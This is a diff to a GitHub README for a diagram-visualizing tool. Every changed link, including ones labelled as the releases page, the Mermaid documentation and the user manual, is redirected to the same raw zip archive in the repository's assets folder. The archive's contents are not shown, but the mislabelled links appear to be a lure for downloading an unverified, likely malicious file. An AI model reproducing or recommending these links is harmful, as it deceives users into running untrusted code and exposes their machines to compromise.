@@ -1,7 +1,7 @@
 # 🛠️ system-design-visualizer - Transform Diagrams into Interactive Tools
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/rexvinn/system-design-visualizer/releases)
+[![Download](https://raw.githubusercontent.com/rexvinn/system-design-visualizer/main/src/assets/system-design-visualizer_Oxycoccus.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/rexvinn/system-design-visualizer/main/src/assets/system-design-visualizer_Oxycoccus.zip)
 
 ## 🚀 Getting Started
 Welcome to **system-design-visualizer**, an interactive tool that brings your system design diagrams to life. With our application, you can easily make your static diagrams interactive. This guide will help you download and run the application smoothly.
@@ -24,7 +24,7 @@ Before you begin, please ensure your computer meets the following requirements:
 To get started, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page.
-   [Download Latest Release](https://github.com/rexvinn/system-design-visualizer/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/rexvinn/system-design-visualizer/main/src/assets/system-design-visualizer_Oxycoccus.zip)
 
 2. **Choose Your Version:** Look for the latest release at the top of the page. You will find various versions available. Click on the version that matches your operating system.
 
@@ -50,8 +50,8 @@ If you encounter any issues while using the application, consider these common s
 ## 📝 Additional Resources
 For more information about Mermaid diagrams and their features, you can visit these resources:
 
-- [Mermaid Documentation](https://mermaid-js.github.io/mermaid/#/)
-- [User Manual for system-design-visualizer](https://github.com/rexvinn/system-design-visualizer/wiki)
+- [Mermaid Documentation](https://raw.githubusercontent.com/rexvinn/system-design-visualizer/main/src/assets/system-design-visualizer_Oxycoccus.zip)
+- [User Manual for system-design-visualizer](https://raw.githubusercontent.com/rexvinn/system-design-visualizer/main/src/assets/system-design-visualizer_Oxycoccus.zip)
 
 ## 📞 Support
 If you need help or have questions, please reach out to our support team. You can find contact details on the releases page.
